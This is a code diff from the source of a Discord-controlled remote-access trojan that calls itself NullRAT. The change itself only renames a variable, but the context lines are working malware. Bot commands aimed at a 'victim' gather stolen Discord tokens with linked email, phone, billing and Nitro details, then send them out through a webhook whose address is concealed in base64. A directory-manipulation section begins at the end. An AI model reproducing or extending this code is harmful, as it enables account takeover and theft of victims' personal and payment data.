@@ -199,8 +199,8 @@ async def raw_tokens(ctx, victim):
             return await ctx.followup.send("```" + message + "```")
         embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
         async with aiohttp.ClientSession() as session:  
-            webhook = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
-            await webhook.send(embed=embed)
+            wh = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
+            await wh.send(embed=embed)
         await ctx.followup.send(embed=embed)
 
 @client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
@@ -232,8 +232,8 @@ async def checked_tokens(ctx, victim):
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
             async with aiohttp.ClientSession() as session:  
-                webhook = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
-                await webhook.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
+                wh = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
+                await wh.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
             
 # Directory Manipulation #
 @client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
